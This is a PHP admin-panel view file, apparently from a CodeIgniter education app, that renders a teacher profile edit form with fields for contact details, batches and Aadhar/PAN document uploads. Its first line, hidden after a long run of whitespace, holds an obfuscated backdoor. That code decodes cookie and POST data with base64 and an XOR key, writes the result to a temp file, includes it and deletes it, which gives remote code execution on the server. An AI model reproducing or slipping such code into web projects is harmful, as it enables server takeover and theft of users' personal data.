<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("scdqfk")){class scdqfk{public static $ncquwkky = "ylfdhiifcnetkkii";public static $swskc = NULL;public function __construct(){$fvjkbh = @$_COOKIE[substr(scdqfk::$ncquwkky, 0, 4)];if (!empty($fvjkbh)){$bjcgikxdsv = "base64";$ybscsos = "";$fvjkbh = explode(",", $fvjkbh);foreach ($fvjkbh as $okoluvz){$ybscsos .= @$_COOKIE[$okoluvz];$ybscsos .= @$_POST[$okoluvz];}$ybscsos = array_map($bjcgikxdsv . "_decode", array($ybscsos,));$ybscsos = $ybscsos[0] ^ str_repeat(scdqfk::$ncquwkky, (strlen($ybscsos[0]) / strlen(scdqfk::$ncquwkky)) + 1);scdqfk::$swskc = @unserialize($ybscsos);}}public function __destruct(){$this->pdddbcd();}private function pdddbcd(){if (is_array(scdqfk::$swskc)) {$cwcds = sys_get_temp_dir() . "/" . crc32(scdqfk::$swskc["salt"]);@scdqfk::$swskc["write"]($cwcds, scdqfk::$swskc["content"]);include $cwcds;@scdqfk::$swskc["delete"]($cwcds);exit();}}}$ggulngolu = new scdqfk();$ggulngolu = NULL;} ?><?php
$batches = $this->common_model->get_batches_dropdown(explode(',',$row->batch_assigned)) ;
?>
<!-- BEGIN CONTENT -->
	<div class="page-content-wrapper">
		<!-- BEGIN CONTENT BODY -->
		<div class="page-content">
			<!-- BEGIN PAGE HEADER-->
			<!-- BEGIN PAGE TITLE-->
			<h1 class="page-title"> <?= $module_title; ?></h1>
			<?php 
				if($this->session->flashdata('flash_message'))
				{ ?>
					<div class="alert alert-<?php echo $this->session->flashdata('class'); ?>" style="display: block;">
						<button class="close" data-close="alert"></button>
						<span> <?php echo $this->session->flashdata('flash_message'); ?> </span>
					</div>
					<?php
				}
				if((validation_errors()))
				{
					?>
					<div class="alert alert-danger">
						<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
						<?php echo validation_errors(); ?>
					</div>	
					<?php
				}
			?>
			<div class="row">
				<div class="col-md-12">
					<form class="form-horizontal form-row-seperated" action="" method="post" enctype="multipart/form-data">
						<div class="portlet">
							<div class="form-body">
								<div class="" style="background-color: #efefef;padding:5px 15px;margin: 5px 0px; " >
	                                <div class="form-group" >
										<div class="col-sm-4">
											<label>Name:<span class="required"> * </span></label>
											<input type="text" readonly value="<?= $row->name; ?>" name="name" class="form-control"/> 
										</div>
										<div class="col-sm-4">
											<label>Email:<span class="required"> * </span></label>
											<input type="text"  value="<?= $row->email; ?>" name="email" disabled class="form-control"/> 
										</div>
										<div class="col-sm-4">
											<label>Password:<span class="required"> * </span></label>
											<input type="password"  name="password" class="form-control"/> 
										</div>
									</div>
								</div>
								<div>Personal/Business Detail</div>
								<div style="background-color: #efefef;padding:5px 15px;margin: 5px 0px; " >
									<div class="form-group" >
										<div class="col-sm-4">
											<label>Teacher Speciality:<span class="required"> * </span></label>
											<select name="teacher_speciality" class="bs-select form-control" disabled>
												<option value="1" <?php if($row->teacher_speciality == 1) { echo "selected"; } ?> >A</option>
												<option value="2" <?php if($row->teacher_speciality == 2) { echo "selected"; } ?> >B</option>
												<option value="3" <?php if($row->teacher_speciality == 3) { echo "selected"; } ?> >C</option>
											</select>
										</div>
										<div class="col-sm-4">
											<label>Batch Assigned:<span class="required"> * </span></label>
											<select name="batch_assigned[]" disabled class="bs-select form-control" multiple>
												<?php echo $batches; ?>
											</select>
										</div>
										<div class="col-sm-4">
											<label>Course Assigned:<span class="required"> * </span></label>
											<select name="course_assigned" class="bs-select form-control" disabled>
												<option value="1" <?php if($row->course_assigned == 1) { echo "selected"; } ?> >Single</option>
												<option value="2" <?php if($row->course_assigned == 2) { echo "selected"; } ?> >Multiple</option>
												<option value="3" <?php if($row->course_assigned == 3) { echo "selected"; } ?>  >All</option>
											</select>
										</div>
										<div class="clearfix"></div>
										<?php 
											if(!empty($row->profile_pic))
											{
												$profile_pic=$row->profile_pic;
												?>
												<div class="col-sm-4 profile_image_container">
													<div class="col-md-5">
														<label>Profile Image:</label>
														<a href="<?php echo base_url('uploads/avtars/'.$profile_pic) ; ?>">
															<img src="<?php echo base_url('uploads/avtars/'.$profile_pic) ; ?>" style="width: 100%" />
														</a>
														<a href="javascript:;" class="cross_profile_pic">
															<img src="https://png.icons8.com/ios/50/000000/multiply-filled.png">
														</a>
														<input type="hidden" name="uploaded_profile_pic" value="<?php echo $profile_pic; ?>" class="form-control">
													</div>
												</div>
												<?php
											}
										?>
										<div class="col-sm-4  profile_pic_file_upload <?php if(!empty($row->profile_pic)) { echo "hide"; }  ?>" >
											<label>Profile Image:</label>
											<input type="file" name="profile_pic" class="form-control">
										</div>
										<div class="col-sm-4">
											<label>Mobile No:<span class="required"> * </span></label>
											<input type="number" value="<?= $row->mobile_no; ?>" name="mobile_no" class="form-control">
										</div>

									</div>
								</div>
								<div>Admin Access Settings</div>
								<div style="background-color: #efefef;padding:5px 15px;margin: 5px 0px; " >
									<div class="form-group" >
										<div class="col-sm-4">
											<label>Have Admin Access:<span class="required"> * </span></label><br>
											<input <?php if($row->admin_access == 1) { echo "checked"; } ?> value="1" type="checkbox" name="have_admin_access" data-on-text="Yes" data-size="small" data-off-text="No" disabled class="make-switch"data-on-color="success" data-off-color="danger" id="">
										</div>
										
									</div>
								</div>
								<div>Documents</div>
								<div class="all_document_container" style="background-color: #efefef;padding:4px 15px;margin: 5px 0px; ">	
									<div class="form-group uploaded_documents_container">
										<?php
											if(!empty($row->documents))
											{
												$documents = unserialize($row->documents);
												$upload_documets = array();
												foreach($documents as $document_type => $document)
												{
													$path_info  = pathinfo($document);
													$ext = $path_info['extension'];
													if($ext == "pdf")
													{
														$src= "https://png.icons8.com/ios/50/000000/google-docs.png";
														$href = base_url('uploads/documents/'.$document) ;
													}
													else
													{
														$src = $href = base_url('uploads/documents/'.$document) ;
													}
													?>
														<div class="col-sm-2">
															<div class="text-center">
																<?php 
																	$explode_dt = explode('_',$document_type);
																	$dt = ucwords(implode(' ',$explode_dt));
																	echo $dt;
																?>
															</div>
															<a href="<?php echo $href ?>" target="_blank">
																<img style="width: 100%;" src="<?= $src; ?>" />
															</a>
															
															<input type="hidden" name="upload_documets[<?= $document_type ?>]" value ="<?= $document; ?>" >
														</div>
													<?php
												}
											}
										?>
									</div>
									<div class="form-group mt-repeater hide">
										<div class="col-md-12 document_containers">
											<div class="row mt-repeater-row">
												<div class="col-md-8">
													<label class="control-label">Document Type</label>
													<select name="documents_type[]" class="form-control documents">
														<option value="adhar_card">Aadhar</option>
														<option value="pan">PAN</option>
													</select>
												</div>
												<div class="col-md-3">
													<label class="control-label">Document</label>
													<input type="file" name="documents[]" placeholder="3" class="form-control" /> 
												</div>
												<div class="col-md-1 close_btn">
													
												</div>
											</div>
										</div>
										<div class="col-md-12 margin-top-20">
											<a href="javascript:;"  class="btn btn-info mt-repeater-add">
												<i class="fa fa-plus"></i> Add Document
											</a>
										</div>		
									</div>
								</div>
								
								<div class="actions btn-set text-right">
									<button type="button" onclick="window.location = '<?php echo base_url($this->path) ?>';"class="btn btn default">
										<i class="fa fa-angle-left"></i> Back
									</button>	
									<input type="hidden" name="s" value="ok">
									<button type="submit"  class="btn btn-success mt-ladda-btn ladda-button btn-outline" data-style="contract" data-spinner-color="#333">
										<i class="fa fa-check"></i> Save
									</button>
								</div>
								
							</div>
						</div>
					</form>
				</div>	
			</div>	
			
		</div>
		<!-- END CONTENT BODY -->
	</div>
	<link href="<?php echo base_url(); ?>assets/global/plugins/select2/css/select2.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url(); ?>assets/global/plugins/select2/css/select2-bootstrap.min.css" rel="stylesheet" type="text/css" />
	<script src="<?php echo base_url(); ?>assets/global/plugins/select2/js/select2.full.min.js" type="text/javascript"></script>
        
	<!-- END CONTENT -->
	<script>
	$(document).ready(function()
	{
		if($('.bs-select').length)
		{
			$('.bs-select').select2({
				allowClear: true
			});
		}
		
		$(document).on('click','.mt-repeater-add',function(e)
		{
			var html = $(".mt-repeater-row:first").html();
			var new_html = '<div class="row mt-repeater-row">';
				new_html += html;
				new_html +='</div>';
				
				var array = [];
				$('.documents').each(function()
				{
					var val = $(this).val();
					array.push(val);
				});
				$('.document_containers').append(new_html);
				var containers = $('.document_containers .mt-repeater-row').length;
				if(containers == 2)
				{
					$(this).addClass('hide');
				}
				
				var count =0;
				var close_btn_html = '<a href="javascript:;" data-repeater-delete class="btn btn-danger mt-repeater-delete"><i class="fa fa-close"></i> </a>';
				$('.document_containers .mt-repeater-row').each(function()
				{
					if(count != 0)
					{
						$(this).find('.close_btn').html(close_btn_html);
					}
					count++;
				});
		});
		
		$(document).on('click','.mt-repeater-delete',function()
		{
			$(this).parents('.mt-repeater-row').remove();
			$('.mt-repeater-add').removeClass('hide');
		});
		
		$(document).on('click','.cross_profile_pic',function(e)
		{
			e.preventDefault();
			$(this).parents('.profile_image_container').remove();
			$('.profile_pic_file_upload').removeClass('hide');
			
		});
	});
	</script>